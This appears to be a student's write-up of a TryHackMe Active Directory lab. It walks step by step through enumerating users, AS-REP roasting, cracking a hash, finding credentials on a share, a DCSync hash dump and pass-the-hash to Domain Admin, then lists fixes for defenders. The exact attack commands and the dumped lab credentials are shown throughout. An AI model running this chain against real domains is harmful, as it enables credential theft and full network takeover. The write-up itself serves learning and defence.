# Active Directory Attack Lab

This is my third cybersecurity project, where I went after a full Active Directory environment instead of a single host. The goal was simple: start with nothing (no creds, no access) and see how far I could get inside a Windows domain using only misconfigurations that show up constantly in real environments.

By the end I had Domain Administrator access and every password hash in the domain.

**Lab:** TryHackMe — "Attacktive Directory"
**Target domain:** spookysec.local
**Setup:** Kali Linux (VirtualBox), connected to the lab over OpenVPN instead of using the browser AttackBox, so I wasn't limited by session time

---

## What I was trying to do

Active Directory runs most corporate networks, and it's usually the main target in a real breach — once you're Domain Admin, you basically own the company's IT. This lab walks through a realistic attack chain against a DC (Domain Controller), using nothing but built-in AD weaknesses. No exploits, no malware, just abusing how Kerberos and SMB are designed to work.

## Tools I used

Nmap, Kerbrute, Impacket (`GetNPUsers`, `secretsdump`), John the Ripper, smbclient, CrackMapExec

---

## Step 1 — Confirming the target

First thing was just checking what I was dealing with. Port 88 (Kerberos) being open is basically a dead giveaway that a machine is a domain controller.

```
nmap -p 88 10.48.191.70

PORT   STATE SERVICE
88/tcp open  kerberos-sec
```

![Nmap scan confirming Kerberos service](screenshots/01-nmap-scan.png)

## Step 2 — Finding real usernames

Before trying to break into any account, I needed to know which accounts actually exist. Kerberos has a quirk where the server responds differently depending on whether a username is real — even without a password. Kerbrute abuses exactly that.

```
kerbrute userenum -d spookysec.local --dc 10.48.191.70 userlist.txt
```

Got 8 valid accounts back: `james`, `svc-admin`, `robin`, `darkstar`, `administrator`, `backup`, `paradox`, `ori`

![Kerbrute enumeration results](screenshots/02-kerbrute-enum.png)

`svc-admin` immediately stood out — service accounts are the classic target for the next step.

## Step 3 — AS-REP Roasting

Normally Kerberos won't hand out anything until you prove you know the password. But some accounts have that check turned off by mistake — usually old service accounts nobody's touched in years. When that happens, the server will freely give you an encrypted ticket, and that ticket is locked using a scrambled version of the real password.

```
impacket-GetNPUsers spookysec.local/ -usersfile valid_users.txt -no-pass -dc-ip 10.48.191.70
```

Sure enough — `svc-admin` had this disabled. Everyone else required proper pre-auth.

![AS-REP hash captured for svc-admin](screenshots/03-asrep-roast.png)

## Step 4 — Cracking the hash

Took the hash offline and ran it against rockyou.txt with John the Ripper.

```
john --wordlist=/usr/share/wordlists/rockyou.txt svc-admin.hash
```

Cracked in about 11 seconds:

```
svc-admin : management2005
```

![Password cracked with John the Ripper](screenshots/04-hash-cracked.png)

That's my first real foothold — an actual working login for the domain.

## Step 5 — Looking around with those creds

With `svc-admin`'s credentials, I checked what file shares were visible over SMB.

```
crackmapexec smb 10.48.191.70 -u svc-admin -p management2005 --shares
```

Found a non-default share called `backup` with read access. Connected to it and there was one file sitting there: `backup_credentials.txt`. Inside was a base64 string.

```
smbclient //10.48.191.70/backup -U svc-admin
cat backup_credentials.txt
echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d
```

Decoded to a second valid account:

```
backup@spookysec.local:backup2517860
```

![Share access, file download, and credential decode](screenshots/05-share-download-decode.png)

This is a really common mistake — someone leaves a plaintext credential file sitting on a share "just for backups" and forgets it's readable by way more people than intended.

## Step 6 — The big one: DCSync

This is where it went from "I have another account" to "I own the domain." I checked whether the `backup` account had replication rights — the kind normally reserved for domain controllers themselves. If it does, you can trick the DC into handing over every password hash in the domain by pretending to be another DC asking to sync.

```
impacket-secretsdump spookysec.local/backup:backup2517860@10.48.191.70
```

It worked. Got every single account's hash, including Administrator:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
```

![DCSync attack dumping every domain hash](screenshots/06-dcsync-dump.png)

## Step 7 — Proving it

Didn't even need to crack the Administrator hash — NTLM hashes can be used directly to log in without ever knowing the plaintext password (Pass-the-Hash).

```
crackmapexec smb 10.48.191.70 -u administrator -H 0e0363213e37b94221497260b0bcb4fc
```

```
spookysec.local\administrator:0e0363213e37b94221497260b0bcb4fc (Pwn3d!)
```

![Pass-the-Hash confirming domain admin access](screenshots/07-pwn3d-confirmed.png)

Full domain compromise, confirmed.

---

## The full chain, start to finish

1. Confirmed the target was a DC (Nmap)
2. Found real usernames with no credentials at all (Kerbrute)
3. Found one account with Kerberos pre-auth disabled (AS-REP Roasting)
4. Cracked its password offline (John the Ripper)
5. Used it to browse shares and found a second, leaked credential
6. Used that account's replication rights to dump every password hash in the domain (DCSync)
7. Logged in as Administrator using the stolen hash directly (Pass-the-Hash)

Whole thing took under two hours, and every step fed directly into the next one.

## Why this matters

None of this needed a zero-day or clever exploit — it's entirely built out of everyday AD misconfigurations:

- A service account with Kerberos pre-auth switched off
- A weak, guessable password
- Credentials left in a plaintext file on a network share
- An account with far more replication rights than it should have had
- NTLM still being accepted at all

This is basically how real-world domain compromises happen. Attackers rarely need a fancy exploit when the environment itself hands them the keys.

## What I'd tell a defender to fix

- Turn on Kerberos pre-authentication for every account, and actually audit for accounts where it's disabled
- Enforce real password complexity, especially for service accounts — these get forgotten and never rotated
- Never leave credentials in plaintext on a share — use a proper secrets manager
- Lock down who has DCSync/replication rights — it should really just be domain controllers and actual domain admins
- Turn off NTLM where you can, and at minimum log/alert on its use
- Set up alerting for DCSync-style requests coming from anything that isn't a real DC — tools like Microsoft Defender for Identity catch this well

---

*Done in a lab environment (TryHackMe "Attacktive Directory") for learning and portfolio purposes.*
